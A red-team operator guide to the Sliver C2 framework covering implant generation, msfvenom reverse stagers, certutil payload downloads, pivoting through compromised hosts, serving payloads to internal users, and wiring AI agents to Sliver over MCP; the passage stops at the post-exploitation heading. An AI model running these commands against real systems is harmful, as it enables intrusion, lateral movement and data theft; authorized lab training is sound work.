---
tags: [redteam, c2, sliver, cheatsheet, guide]
date: 2026-05-02
author: clawd
version: v1.7.3
---

# Sliver C2 — Red Team Operator Guide

> [!info] Version
> This guide covers **Sliver v1.7.3** (released Feb 2026). Commands and features are verified against official docs at [sliver.sh/docs](https://sliver.sh/docs).

> [!danger] Disclaimer
> This guide is for **authorized lab practice and educational purposes only**. Unauthorized access to computer systems is illegal. Always obtain written permission before conducting any red team engagement or penetration test. The authors assume no liability for misuse.

---

## 1. Overview

**Sliver** is an open-source cross-platform adversary emulation / C2 framework created by Bishop Fox. It's designed for red team operations, penetration testing, and adversary simulation.

### Why Sliver?

| Feature | Benefit |
|---------|---------|
| Open-source | Full transparency, community-driven, free |
| Cross-platform | Windows, Linux, macOS implants |
| Multiplayer | Multiple operators collaborate on one server |
| Extensible | Armory package manager for community modules |
| Multiple protocols | HTTP(S), DNS, WireGuard, mTLS, named pipes |
| Beacon + Session | Flexible real-time and asynchronous C2 |
| DNAT/redirector support | Built for operational infrastructure |
| Stagers | Metasploit-compatible staging protocol (TCP/HTTP/HTTPS) |
| Loot store | Server-side file/credential storage shared across operators |
| Watchtower | Automated VT & X-Force implant hash monitoring |
| MCP support | Model Context Protocol for AI agent integration |
| External builders | Offload implant builds to other systems for performance or platform support |
| Active development | Regular updates, modern codebase (Go) |

### Architecture

```
┌──────────────────────────────────────────────┐
│                Sliver Server                  │
│  ┌──────────┐  ┌───────────┐  ┌──────────┐ │
│  │Listeners │  │  Implant   │  │ Multiplay │ │
│  │(Jobs)    │  │  Generator │  │   Server  │ │
│  └──────────┘  └───────────┘  └──────────┘ │
│         ▲                               ▲     │
└─────────┼───────────────────────────────┼─────┘
          │                               │
    ┌─────┴─────┐                   ┌─────┴─────┐
    │  Implant   │                   │  Client    │
    │ (on Target)│                   │(Operator)  │
    └───────────┘                   └───────────┘
```

- **Server** — The C2 hub. Manages listeners, generates implants, stores loot/creds, hosts multiplayer.
- **Client** — The operator's CLI interface. Connects to the server via mutual TLS (mTLS). Multiple clients can connect simultaneously.
- **Implant** — The compiled binary deployed to the [[Target]]. Calls back to the server via configured protocol(s).

> [!tip] Key Distinction
> Sliver separates the **server** (runs on your infra) from the **client** (runs on your operator machine). Implants connect to the server, not the client.

---

## 2. Installation & Setup

### Server Install

```bash
# Official one-liner (Linux — requires root for systemd service setup)
curl https://sliver.sh/install | sudo bash

# Or just download the server binary directly (no root needed)
# https://github.com/BishopFox/sliver/releases

# Or via Go install
go install github.com/bishopfox/sliver/server/cmd/sliver-server@latest
```

> [!tip] Linux Strongly Recommended
> The Sliver server runs best on Linux (or macOS). Some features are harder to get working on a Windows server. Operators can use any platform to connect.

### Starting the Server

```bash
# First run — generates operator configs, certificates, etc.
sliver-server

# Daemon mode (recommended for persistent ops)
sliver-server daemon

# The server listens on:
# - 1337 (gRPC — multiplayer client connections)
# - 1338 (gRPC over WireGuard)
# - 31337 (default HTTP listener port — configurable)
```

> [!note] Server Data
> Sliver stores its data in `~/.sliver/` by default. This includes certificates, implant configurations, loot, and session databases.

### Client Setup

```bash
# Install the client (same binary)
curl https://sliver.sh/install | sudo bash

# Or download from GitHub releases:
# https://github.com/BishopFox/sliver/releases
```

> [!tip] Multiplayer Mode (Recommended)
> For most engagements, use Sliver's **multiplayer mode** — the server listens for operator connections, and operators connect from their machines with config files. Client configs are stored in `~/.sliver-client/configs/`.

### Multiplayer Mode

Multiplayer mode allows multiple operators to collaborate on the same server. The server exposes the operator-facing listener over gRPC/mTLS with an optional WireGuard wrapper.

```bash
# On the server console, enable multiplayer and generate operator configs:
[server] sliver > multiplayer

[*] Multiplayer mode enabled!

[server] sliver > new-operator --name agustin --lhost <SERVER_IP> --permissions all

[*] Generating new client certificate, please wait ...
[*] Saved new client config to: /path/to/agustin_<host>.cfg
```

```bash
# Operators import and connect:
sliver-client import ./agustin_<host>.cfg
sliver-client
# Interactive prompt to select server
```

**Multiplayer Modes:**

| Mode | Flag | Port | Description |
|------|------|------|-------------|
| **Direct mTLS** | `--enable-wg` | TCP/31337 | Operator connects directly over gRPC/mTLS |
| **WireGuard wrapper** | default | UDP/31337 | gRPC/mTLS tunneled inside WireGuard (more secure) |
| **Tailscale** | `multiplayer -T` | Tailscale | Multiplayer only accessible via Tailscale tailnet |

> [!tip] Daemon Mode
> If the server runs as a daemon, generate operators via CLI:
> ```bash
> sliver-server operator --name agustin --lhost <SERVER_IP> --permissions all --save agustin.cfg
> ```

> [!warning] Config Security
> Operator configs contain mTLS certificates (and optionally WireGuard keys). Treat them like private keys — never commit to version control, never transmit over unencrypted channels.

---

## 3. Core Concepts

### Sessions vs. Beacons

| Aspect | Session (Interactive) | Beacon (Asynchronous) |
|--------|----------------------|----------------------|
| Connection | Persistent TCP | Polling (interval-based) |
| Real-time | ✅ Yes | ❌ No (delayed) |
| Stability | Fails on disconnect | Resilient — re-polls |
| Detection | More visible | Less visible (low & slow) |
| Use case | Active exploitation, pivoting | Long-term persistence, stealth |
| Command | `sessions` | `beacons` |
| Interact | `use <id>` | `use <id>` |

```sliver
# Session mode — real-time interaction
generate --name session-implant --http <SERVER_IP> --format exe

# Beacon mode — asynchronous polling (every 60s)
generate --name beacon-implant --http <SERVER_IP> --format exe --beacon

# Convert between modes
beacon-to-session <beacon-id>
session-to-beacon <session-id>
```

> [!tip] Operational Guidance
> Use **beacons** for long-haul operations and OPSEC-sensitive environments. Use **sessions** when you need real-time interaction (e.g., pivoting, interactive shells). Switch modes as needed.

### Operators

Operators are authorized users who can connect to the Sliver server. Each gets a unique mTLS certificate.

```sliver
# Multiplayer management (in client)
multiplayer          # Show multiplayer server info
operators            # List connected operators
```

### Profiles

Profiles are reusable implant configurations — they predefine transport, format, and other options so you don't have to type them every time.

```sliver
profiles new --name windows-http --http <SERVER_IP> --format exe --mtls <SERVER_IP>
profiles new --name linux-dns --dns <SERVER_IP> --format elf
profiles new --name stealth-beacon --http <SERVER_IP> --beacon 120 --format shellcode
```

### Listeners & Jobs

- **Listener** — A protocol handler waiting for implant callbacks (e.g., HTTP on port 80).
- **Job** — A running listener instance. The server runs listeners as "jobs."

```sliver
# Start an HTTP listener
http --lhost 0.0.0.0 --lport 80

# Start an HTTPS listener
https --lhost 0.0.0.0 --lport 443 --cert ./cert.pem --key ./key.pem

# Start a DNS listener
dns --domains c2.example.com --lhost 0.0.0.0

# Start a WireGuard listener
wg --lhost 0.0.0.0 --lport 53

# Start mTLS listener
mtls --lhost 0.0.0.0 --lport 4443

# View running jobs
jobs

# Kill a job
jobs kill <job-id>
```

### Profiles

Profiles are reusable implant configurations — they predefine transport, format, and other options so you don't have to type them every time.

```sliver
profiles new --name windows-http --http <SERVER_IP> --format exe
profiles new --name linux-dns --dns <SERVER_IP> --format elf
profiles new --name stealth-beacon --http <SERVER_IP> --beacon 120 --format shellcode
```

### Stagers 🔥

Stagers allow you to deliver large implants (~10MB) via a small initial stager that downloads the full payload. Sliver supports the Meterpreter staging protocol over TCP, HTTP, and HTTPS.

**Architecture:**
1. **Profile** — Create an implant profile (usually shellcode format)
2. **stage-listener** — Serve the payload on a staging URL
3. **Stager** — Generated by `msfvenom`, Sliver's `generate stager`, or custom code

```sliver
# 1. Create a shellcode profile
profiles new --name win-stage --http 10.10.10.10 --format shellcode win-stage

# 2. Start the staging listener linked to the profile
stage-listener --url http://10.10.10.10:1234 --profile win-stage

[*] No builds found for profile win-stage, generating a new one
[*] Job 1 (tcp) started

# 3. Generate a stager with msfvenom
# HTTP stager:
msfvenom --payload windows/x64/custom/reverse_winhttp \
  LHOST=10.10.10.10 LPORT=1234 LURI=/test.woff \
  --format raw --out /tmp/stager.bin

# TCP stager (requires --prepend-size on listener):
stage-listener --url tcp://10.10.10.10:1234 --profile win-stage --prepend-size
msfvenom --payload windows/x64/custom/reverse_tcp \
  LHOST=10.10.10.10 LPORT=1234 --format raw --out /tmp/stager.bin
```

**Shellcode Tuning Options (profiles new):**

| Flag | Description | Platforms |
|------|-------------|-----------|
| `--shellcode-compress` | aPLib compression | Windows, macOS, Linux |
| `--shellcode-entropy` | 1=none, 2=random names, 3=random+encrypt | Windows only |
| `--shellcode-exitopt` | 1=exit thread, 2=exit process, 3=block | Windows only |
| `--shellcode-bypass` | 1=none, 2=abort, 3=continue on failure | Windows only |
| `--shellcode-headers` | 1=overwrite, 2=keep PE headers | Windows only |
| `--shellcode-thread` | Run entry as new thread | Windows only |
| `--shellcode-encoder` | Optional encoder (see `shellcode-encoders`) | Windows |
| `--shellcode-oep` | Override original entry point (0=default) | Windows only |

**Encrypted Staging:**

```sliver
stage-listener --url http://10.10.10.10:80 --profile win-stage \
  --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV
```

> [!tip] Custom Stagers
> The default URL extension for stage retrieval is `.woff`. Custom stagers must request `http://SERVER:PORT/<anything>.woff`. This can be configured via the `stager_file_ext` C2 setting.

### Loot System

The `loot` command provides a **server-side store** for looted files and credentials shared across all operators in multiplayer mode.

```sliver
# Pull a file directly from a remote system to the loot store
loot remote

# Add a file from your local machine to the loot store
loot local

# View/fetch loot
loot fetch     # Interactive menu to browse and retrieve loot

# Remove loot from the server
loot rm
```

> [!tip] Auto-Loot
> Several commands (`sideload`, `execute-assembly`) have a `--loot` flag that automatically saves their output to the loot store.

### Watchtower 🔍

The Sliver server can periodically monitor VirusTotal and IBM X-Force for your implant hashes — alerting you if a build has been uploaded.

**Setup:** Add your API keys to `~/.sliver/configs/server.json`:

```json
{
  "watch_tower": {
    "vt_api_key": "YOUR_VIRUSTOTAL_API_KEY",
    "xforce_api_key": "YOUR_XFORCE_API_KEY",
    "xforce_api_password": "YOUR_XFORCE_API_PASSWORD"
  }
}
```

```sliver
# Start/stop monitoring
monitor start
monitor stop
```

> [!info] Rate Limits
> Sliver respects free-tier limits: 4 req/min / 500 req/day for VirusTotal, 6 req/hour for X-Force.

### MCP (Model Context Protocol) 🤖

Sliver supports MCP for connecting AI models (Claude, OpenAI Codex, etc.) to Sliver operations. MCP is experimental — not all functionality is supported yet.

**STDIO Mode (Recommended — uses multiplayer):**

```
# OpenAI Codex config:
[mcp_servers.sliver]
args = ["mcp", "--config", "/path/to/multiplayer.cfg"]
command = "/path/to/sliver-client"

# Claude Code:
claude mcp add sliver -- /path/to/sliver-client mcp --config /path/to/multiplayer.cfg
```

**HTTP/SSE Mode:**

```sliver
sliver > mcp
Status: stopped
Transport: sse
Listen: 127.0.0.1:8080
Endpoint: http://127.0.0.1:8080/sse

sliver > mcp start --transport http

[*] Starting MCP server (http) on 127.0.0.1:8080
[*] Endpoint: http://127.0.0.1:8080/mcp
[*] Auth Header: Authorization
[*] Auth Token: 6f90c3b3c6058fa59f570e281f3f8d39
```

> [!warning] Auto-Generated Token
> On first HTTP/SSE use, Sliver generates a random 128-bit token in `~/.sliver-client/mcp.yaml`. Every MCP request must include this token in the `Authorization` header. If `mcp.yaml` exists, the listener only starts when the token is ≥8 chars.

### C2 Advanced Options

Advanced options are passed as URL-encoded parameters in the `generate` command:

```sliver
generate --http http://example.com?driver=wininet
```

**HTTP C2 Options:**

| Parameter | Description | Example |
|-----------|-------------|---------|
| `net-timeout` | Network timeout | `?net-timeout=30s` |
| `tls-timeout` | TLS handshake timeout | `?tls-timeout=10s` |
| `poll-timeout` | Poll timeout | `?poll-timeout=60s` |
| `max-errors` | Max HTTP errors before fail | `?max-errors=10` |
| `driver` | Force HTTP driver (`wininet` on Windows) | `?driver=wininet` |
| `force-http` | Always use plaintext HTTP | `?force-http=true` |
| `disable-accept-header` | Disable Accept header | `?disable-accept-header=true` |
| `disable-upgrade-header` | Disable Upgrade header | `?disable-upgrade-header=true` |
| `proxy` | HTTP proxy URI | `?proxy=http://proxy.corp:8080` |
| `proxy-username` | Proxy username | `?proxy-username=user` |
| `proxy-password` | Proxy password | `?proxy-password=pass` |
| `ask-proxy-creds` | Prompt for proxy creds (wininet) | `?ask-proxy-creds=true` |
| `host-header` | Domain fronting | `?host-header=cdn.example.com` |

**DNS C2 Options:**

| Parameter | Description | Example |
|-----------|-------------|---------|
| `timeout` | Network timeout | `?timeout=30s` |
| `retry-wait` | Wait before retry | `?retry-wait=5s` |
| `retry-count` | Number of retries | `?retry-count=3` |
| `workers-per-resolver` | Worker goroutines per resolver | `?workers-per-resolver=2` |
| `max-errors` | Max query errors | `?max-errors=10` |
| `force-resolv-conf` | Custom resolv.conf (URL encode newlines) | `?force-resolv-conf=...` |
| `resolvers` | Specific DNS resolvers (`+` separated) | `?resolvers=1.1.1.1+9.9.9.9` |

> [!warning] Advanced Users Only
> These options can cause broken or unexpected implant behavior. Only use them if you understand what they do.

### External Builders

External builders let you offload implant builds to other systems — useful for adding platform support (e.g., connecting a MacBook for macOS builds) or increasing build performance.

```bash
# On the builder machine:
sliver-server builder -c operator-multiplayer.cfg

# Builder must have a unique name (hostname by default, override with --name)
```

```sliver
# View connected builders and their capabilities
sliver > builders

# Offload a build to an external builder
sliver > generate --mtls localhost --os mac --arch arm64 --external-builder

[*] Using external builder: macbook-pro.local
[*] Externally generating new darwin/arm64 implant binary
[*] Build completed in 1m19s
```

> [!tip] Implant Customization
> You can fork Sliver, modify the implant source, compile a custom `sliver-server`, and connect it as an external builder to a mainline server. Operators generate custom implants via `generate --external-builder`.

---

## 4. Quick Start Workflow

> [!note] Scenario
> You have a Sliver server at `10.10.10.10` and want to get a session on a Windows target in your lab.

### Step-by-Step: First Session

```bash
# 1. Start the Sliver server (on your C2 server)
sliver-server daemon
```

```bash
# 2. Generate an operator config and connect
sliver-server operator --name agustin --lhost 10.10.10.10 --save ./
sliver import agustin.cfg
sliver
```

```sliver
# 3. Inside the Sliver client, start a listener
sliver > http --lhost 10.10.10.10 --lport 80

[*] Job 1 (http) started

# 4. Generate an implant
sliver > generate --name first-implant --http 10.10.10.10 --format exe

[*] Generating new windows/amd64 implant binary
[*] Build completed, output: /home/agustin/.sliver/outputs/first-implant.exe

# 5. Serve the implant for download
sliver > websites

# Or just copy it from the output path
# Transfer to target using your preferred method

# 6. Execute on target (your lab target)
# On the Windows target:
first-implant.exe

# 7. Back in Sliver — you'll see:
# [+] Session 1 BOF_FANCY_BEACON - 192.168.1.50:49812 (DESKTOP-LAB) - windows/amd64

# 8. Interact with the session
sliver > use 1

[*] Active session BOF_FANCY_BEACON (1)

sliver (BOF_FANCY_BEACON) > whoami
LAB\agustin

sliver (BOF_FANCY_BEACON) > getuid
LAB\agustin

sliver (BOF_FANCY_BEACON) > ps
# ... process listing ...

sliver (BOF_FANCY_BEACON) > shell whoami
# ... interactive shell command ...

sliver (BOF_FANCY_BEACON) > background
# Return to main menu
```

> [!tip] Transfer Methods
> For lab practice, common implant transfer methods include:
> - **Python HTTP server**: `python3 -m http.server 8000` on your server
> - **Sliver's hosted payload**: Use `profiles` + `http` listener to serve directly
> - **SMB share**: For air-gapped or restricted networks
> - **Certutil**: `certutil -urlcache -split -f http://10.10.10.10/implant.exe implant.exe` (Windows)

---

## 5. Most Used Commands

### Session & Beacon Management

```sliver
# List all active sessions
sessions

# List all active beacons
beacons

# Interact with a session/beacon by ID
use 1

# Interact by name
use BOF_FANCY_BEACON

# Background the current session
background

# Kill a session
kill <session-id>

# Convert beacon to interactive session
beacon-to-session <beacon-id>

# Convert session to beacon
session-to-beacon <session-id>
```

### Implant Generation

```sliver
# Basic HTTP implant (Windows EXE)
generate --name my-implant --http 10.10.10.10 --format exe

# HTTPS implant with mTLS fallback
generate --name secure-implant --https 10.10.10.10 --mtls 10.10.10.10 --format exe

# DNS implant (Linux ELF)
generate --name dns-implant --dns c2.example.com --format elf

# Beacon-mode implant (polls every 60 seconds)
generate --name stealth-implant --http 10.10.10.10 --beacon 60 --format exe

# WireGuard implant
generate --name wg-implant --wg 10.10.10.10 --format exe

# Shellcode format (for injection)
generate --name shellcode-implant --http 10.10.10.10 --format shellcode

# DLL format
generate --name dll-implant --http 10.10.10.10 --format dll

# Service format (for privilege escalation)
generate --name svc-implant --http 10.10.10.10 --format service

# With specific architecture
generate --name x86-implant --http 10.10.10.10 --format exe --arch 386
```

### Profiles

```sliver
# Create a new profile
profiles new --name win-http --http 10.10.10.10 --format exe
profiles new --name lin-dns --dns c2.example.com --format elf --arch amd64

# List all profiles
profiles

# Generate an implant from a profile
profiles generate --name win-http

# Remove a profile
profiles rm win-http
```

### Implant Management

```sliver
# List previously generated implants
implants

# List implant build logs
implants --verbose

# Regenerate an implant from history
regenerate --name my-implant
```

### Listeners & Jobs

```sliver
# Start listeners
http --lhost 0.0.0.0 --lport 80
https --lhost 0.0.0.0 --lport 443 --cert ./server.pem --key ./server-key.pem
dns --domains c2.example.com --lhost 0.0.0.0
mtls --lhost 0.0.0.0 --lport 4443
wg --lhost 0.0.0.0 --lport 53

# List running jobs
jobs

# Kill a job
jobs kill <job-id>
```

### Multiplayer

```sliver
# Connect to a multiplayer server (from client)
multiplayer --lhost 10.10.10.10 --lport 1337 --name agustin

# List connected operators
operators
```

### Shell & Command Execution

```sliver
# Execute a command via the implant (non-interactive)
shell whoami
shell ipconfig /all
shell net user

# Execute a binary on the target
execute C:\Windows\System32\cmd.exe /c whoami
execute /bin/bash -c "id"

# Interactive shell (opens a proper shell)
interactive
```

> [!warning] Shell vs Execute
> `shell` uses Sliver's built-in command execution (less OPSEC risk). `execute` runs an actual binary on the target and may trigger EDR. Prefer `shell` for simple commands.

### File Operations

```sliver
# Upload a file to the target
upload /local/path/tool.exe C:\Users\Public\tool.exe
upload ./exploit.py /tmp/exploit.py

# Download a file from the target
download C:\Users\agustin\Documents\secret.docx
download /etc/passwd

# List directory contents
ls C:\Users\
ls /etc/

# Change directory
cd C:\Users\Public
cd /tmp

# Read a file
cat C:\Users\agutron\Desktop\notes.txt
cat /etc/hosts

# Create directory
mkdir C:\Users\Public\tools
mkdir /tmp/sliver-work

# Remove a file
rm C:\Users\Public\tool.exe
rm /tmp/exploit.py
```

### Process Management

```sliver
# List running processes
ps

# Get current process info
getpid

# Get current user
getuid

# Migrate to another process (post-exploitation staple)
migrate <pid>

# Elevate to SYSTEM (Windows)
getsystem

# Kill a process
kill <pid>

# Terminate the implant itself
die
```

### Network Reconnaissance

```sliver
# Network interfaces
ifconfig

# Network connections
netstat

# Ping sweep
ping 192.168.1.1
ping 10.0.0.0/24

# Resolve DNS
resolve google.com

# Port scanning (via armory extension)
# See armory section below
```

### Pivoting & Tunneling

Sliver provides three primary tunneling mechanisms for pivoting through compromised hosts:

| Mechanism | Direction | Use Case |
|-----------|-----------|----------|
| `portfwd` | Local → Remote | Forward a local port to a target through the implant |
| `rportfwd` | Remote → Local | Forward a remote port back to your attacker machine |
| `socks5` | Bidirectional | Full SOCKS5 proxy for dynamic routing |

#### `portfwd` — Local Port Forwarding

Forward a port on your operator machine through the implant to an internal target. Useful when you need to access a service on a host you can't reach directly.

```sliver
# Forward local port 8888 → target's internal web server
sliver (IMPLANT) > portfwd add --bind 127.0.0.1:8888 --forward 192.168.1.50:80

[*] Port forwarding 127.0.0.1:8888 -> 192.168.1.50:80
[*] Forwarder ID: 1

# Now browse the internal service from your operator machine:
# http://127.0.0.1:8888  → routes through implant → 192.168.1.50:80

# Forward local 2222 → target's SSH for lateral movement
sliver (IMPLANT) > portfwd add --bind 127.0.0.1:2222 --forward 10.0.0.5:22

# List active forwards
sliver (IMPLANT) > portfwd

ID  Bind Address      Remote Address      Protocol   Active
=== ================  ==================  =========  ======
1   127.0.0.1:8888    192.168.1.50:80   TCP        true
2   127.0.0.1:2222    10.0.0.5:22       TCP        true

# Remove a forward when done
sliver (IMPLANT) > portfwd remove 1

[*] Removed port forward 1
```

> [!tip] `portfwd` vs `portfwd add --remote`
> `--remote` binds the forward on the implant's network interface (exposes to the implant's local subnet). Without `--remote`, it binds on your operator machine only.

---

#### `rportfwd` — Reverse Port Forwarding 🔥

Forward a port from the **implant's host** back to a service on **your attacker machine**. This is powerful for:
- Exposing a local exploit server to the target network
- Bouncing connections from internal targets back to your tools
- Setting up redirectors or catchers on the implant's interface

```sliver
# Scenario: You have a Python exploit server on your attacker machine (127.0.0.1:9090)
# You want the compromised host (and its internal network) to reach it.

# 1. Start your exploit server on the attacker machine
(attacker) $ python3 -m http.server 9090

# 2. On the implant, forward remote port 8080 → your attacker machine's 9090
sliver (IMPLANT) > rportfwd add --bind 0.0.0.0:8080 --forward 10.10.10.10:9090

[*] Reverse port forwarding 0.0.0.0:8080 -> 10.10.10.10:9090
[*] Reverse Forwarder ID: 1

# Now anyone on the implant's network can reach your exploit server:
# http://<implant-ip>:8080  → routes through implant → 10.10.10.10:9090
```

**Real-World Example — Internal Phishing Redirect:**

```sliver
# You want to serve a payload from the compromised host's interface
# so internal targets see a "local" IP and don't suspect external C2.

# On attacker: serve payload
(attacker) $ python3 -m http.server 8000 --directory /payloads/

# On implant: expose it as port 80 on the implant's IP
sliver (IMPLANT) > rportfwd add --bind 0.0.0.0:80 --forward 10.10.10.10:8000

[*] Reverse port forwarding 0.0.0.0:80 -> 10.10.10.10:8000
[*] Reverse Forwarder ID: 2

# Internal users browsing to http://<implant-ip> see your payload server
# The traffic looks like it's coming from an internal host
```

**Real-World Example — Bouncing Metasploit Handler:**

```sliver
# You have a Meterpreter handler on your attacker machine at 4444
# You want implants on the target's subnet to reach it through the compromised host.

# On attacker: start handler
(attacker) $ msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.10.10; set LPORT 4444; run"

# On implant: forward the handler port
sliver (IMPLANT) > rportfwd add --bind 0.0.0.0:4444 --forward 10.10.10.10:4444

[*] Reverse port forwarding 0.0.0.0:4444 -> 10.10.10.10:4444

# Now your second-stage payload on the internal network calls back to
# <implant-ip>:4444, which tunnels back to your Metasploit handler
```

```sliver
# List reverse forwards
sliver (IMPLANT) > rportfwd

ID  Bind Address      Remote Address       Protocol   Active
=== ================  ===================  =========  ======
1   0.0.0.0:8080      10.10.10.10:9090   TCP        true
2   0.0.0.0:80        10.10.10.10:8000   TCP        true
3   0.0.0.0:4444      10.10.10.10:4444   TCP        true

# Remove a reverse forward
sliver (IMPLANT) > rportfwd remove 2

[*] Removed reverse port forward 2
```

> [!warning] Binding on 0.0.0.0
> When you bind on `0.0.0.0`, the port is exposed to the implant's entire network interface. This is usually what you want for `rportfwd`, but be aware it may trigger host-based firewalls or IDS.

> [!danger] OPSEC Note
> `rportfwd` creates listening ports on the compromised host. These may be visible to:
> - Local `netstat` / `ss` output
> - EDR that monitors new listening ports
> - Network scans from defenders
> Use short-duration forwards and clean up promptly.

---

#### `socks5` — Dynamic SOCKS5 Proxy

The `socks5` command creates a full SOCKS5 proxy through the implant. This is the most flexible pivoting tool — route any TCP traffic dynamically through the target's network.

```sliver
# Start SOCKS5 proxy on your operator machine
sliver (IMPLANT) > socks5 --bind 127.0.0.1:1080

[*] Started SOCKS5 proxy on 127.0.0.1:1080
[*] Proxy ID: 1

# Configure your tools to use the proxy:
# proxychains, FoxyProxy, browser settings, etc.
```

**Using with Proxychains (Linux):**

```bash
# /etc/proxychains.conf — add at bottom:
socks5 127.0.0.1 1080

# Now any tool can route through the implant's network:
$ proxychains nmap -sT -p 22,80,443,445 192.168.1.0/24
$ proxychains ssh user@192.168.1.100
$ proxychains curl http://192.168.1.50:8080
$ proxychains python3 exploit.py  # Exploit an internal target through the tunnel
```

**Using with curl / wget:**

```bash
# Direct SOCKS5 usage
curl --socks5 127.0.0.1:1080 http://192.168.1.50:80
wget --no-check-certificate -e use_proxy=yes -e socks_proxy=127.0.0.1:1080 http://192.168.1.50/
```

**Using with Metasploit:**

```bash
msfconsole -q
msf6 > setg Proxies socks5:127.0.0.1:1080
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 192.168.1.100
msf6 > run
# All Metasploit traffic routes through the Sliver SOCKS5 tunnel
```

**Using with Chisel (double-pivot):**

```bash
# If you need to chain through multiple implants:
# Sliver SOCKS5 (127.0.0.1:1080) → Chisel client → Chisel server → deeper network

# On attacker: chisel server
$ chisel server -p 8080 --reverse

# Through Sliver SOCKS5, connect chisel client to deeper target
$ proxychains chisel client 127.0.0.1:8080 127.0.0.1:9090:socks
```

```sliver
# List active SOCKS5 proxies
sliver (IMPLANT) > socks5

ID  Bind Address      Active
=== ================  ======
1   127.0.0.1:1080    true

# Stop a SOCKS5 proxy
sliver (IMPLANT) > socks5 stop 1

[*] Stopped SOCKS5 proxy 1
```

> [!tip] SOCKS5 vs `portfwd`
> Use `socks5` when you need **dynamic routing** to multiple targets or unknown ports. Use `portfwd` when you need **static, predictable** access to a specific service. SOCKS5 has slightly more overhead but is far more flexible.

> [!warning] UDP Not Supported
> Sliver's SOCKS5 proxy only supports TCP. UDP traffic (e.g., DNS, SNMP traps) won't route through it.

---

#### Multi-Hop Pivoting (Chaining Through Multiple Implants) 🔗

Real networks have multiple subnets. Sliver's `pivots` command lets you chain through multiple compromised hosts to reach deeper networks.

**Scenario: Three-tier network**
```
Attacker (10.10.10.10)
    ↓
Target 1 (Windows, 192.168.1.50) — DMZ
    ↓
Target 2 (Linux, 10.0.0.10) — Internal subnet
    ↓
Target 3 (Linux, 172.16.0.25) — Sensitive subnet
```

**Method 1: SOCKS5 + Proxychains (Recommended)**

```sliver
# Step 1: Get session on Target 1
sliver > use 1

# Step 2: Start SOCKS5 on Target 1
sliver (TARGET1) > socks5 --bind 127.0.0.1:1080

# Step 3: Generate implant for Target 2 that routes through Target 1's network
sliver > generate --name target2-implant --http 192.168.1.50 --format elf
# Note: Target 2 reaches out to 192.168.1.50 (Target 1's DMZ IP) for C2

# Step 4: Upload via SOCKS5 and execute
# In another terminal:
$ proxychains scp ./target2-implant labuser@10.0.0.10:/tmp/
$ proxychains ssh labuser@10.0.0.10 "chmod +x /tmp/target2-implant && /tmp/target2-implant"

# Step 5: Target 2 calls back through Target 1's network
sliver > sessions
# [+] Session 2 TARGET2 - 10.0.0.10:51234 (LINUX-INT) - linux/amd64

# Step 6: Now chain through Target 2 for deeper access
sliver > use 2
sliver (TARGET2) > socks5 --bind 127.0.0.1:1081

# Step 7: Configure proxychains for two hops
# /etc/proxychains.conf:
# socks5 127.0.0.1 1080   # First hop: through Target 1
# socks5 127.0.0.1 1081   # Second hop: through Target 2

# Step 8: Reach Target 3 (deep network)
$ proxychains nmap -sT -p 22,80,443 172.16.0.25
$ proxychains ssh admin@172.16.0.25
```

**Method 2: Port Forward Chaining**

```sliver
# Step 1: On Target 1, forward local 2222 → Target 2's SSH
sliver (TARGET1) > portfwd add --bind 127.0.0.1:2222 --forward 10.0.0.10:22

# Step 2: SSH to Target 2 through the forward
$ ssh -p 2222 labuser@127.0.0.1
# (This tunnels through Target 1 → Target 2)

# Step 3: On Target 2, start another forward for Target 3
# (You'd need a second Sliver session on Target 2)
sliver (TARGET2) > portfwd add --bind 127.0.0.1:3333 --forward 172.16.0.25:22

# Step 4: Chain the forwards
$ ssh -p 3333 admin@127.0.0.1
# Attacker → Target 1 → Target 2 → Target 3
```

**Method 3: rportfwd for Reverse Callbacks**

```sliver
# Scenario: You need Target 3 to callback to Target 2, then to you

# Step 1: On Target 2, forward its port 8443 back to your C2
sliver (TARGET2) > rportfwd add --bind 0.0.0.0:8443 --forward 10.10.10.10:443

# Step 2: Generate implant for Target 3 that calls back to Target 2
sliver > generate --name target3-implant --https 10.0.0.10:8443 --format elf

# Step 3: Upload to Target 3 via SOCKS5/proxychains
$ proxychains scp target3-implant admin@172.16.0.25:/tmp/

# Step 4: Execute on Target 3
# Target 3 → 10.0.0.10:8443 (Target 2) → tunnels to 10.10.10.10:443 (You)
```

**Method 4: Chisel Double-Pivot (External Tool)**

```bash
# When Sliver's built-in pivoting isn't enough, chain with Chisel:

# On attacker: start Chisel server
$ chisel server -p 8080 --reverse

# On Target 1 (via Sliver SOCKS5): connect Chisel client back to attacker
$ proxychains chisel client 10.10.10.10:8080 R:9090:socks

# Now you have a second SOCKS proxy on attacker:9090
# This routes: Attacker → Target 1 → (Target 1's internal network)

# For deeper pivot, repeat the process from Target 2
```

**Pivoting Chain Summary:**

| Technique | Complexity | Use Case | OPSEC |
|-----------|------------|----------|-------|
| SOCKS5 + proxychains | Low | General recon, multiple targets | Good |
| Port forward chain | Medium | Specific service access | Good |
| rportfwd cascade | High | Deep callbacks, redirectors | Moderate |
| Chisel + Sliver | High | Complex multi-hop, UDP needs | Moderate |

> [!tip] Naming Convention
> When managing multiple pivots, name your sessions clearly:
> ```sliver
> sliver > rename 1 dmz-webserver
> sliver > rename 2 internal-db
> sliver > rename 3 sensitive-dc
> ```

> [!danger] Cleanup is Critical
> Multi-hop pivots create multiple listening ports and network paths. Always track what you've opened:
> ```sliver
> # Before disconnecting, audit all forwards
> sliver > portfwd
> sliver > rportfwd
> sliver > socks5
> 
> # Remove everything
> sliver > portfwd remove 1
> sliver > rportfwd remove 1
> sliver > socks5 stop 1
> ```

---

#### SSH Tunneling (Bonus)

Sliver also supports SSH through implants for direct interactive access:

```sliver
# SSH through the implant with password auth
sliver (IMPLANT) > ssh --user root --password <pass> 192.168.1.50

# SSH with private key
sliver (IMPLANT) > ssh --user root --priv-key /path/to/id_rsa 192.168.1.50

# This spawns an interactive SSH session through the implant's network
```

#### Pivoting Summary Table

| Command | Direction | Binds On | Best For |
|---------|-----------|----------|----------|
| `portfwd add` | You → Target | Operator machine | Accessing specific internal services |
| `portfwd add --remote` | You → Target | Implant machine | Exposing forward to implant's subnet |
| `rportfwd add` | Target → You | Implant machine | Serving payloads/exploits to internal hosts |
| `socks5` | Bidirectional | Operator machine | Dynamic multi-target routing |
| `ssh` | Interactive | Through implant | Direct shell access to internal hosts |

### Post-Exploitation

```sliver
# Screenshot (Windows/macOS)
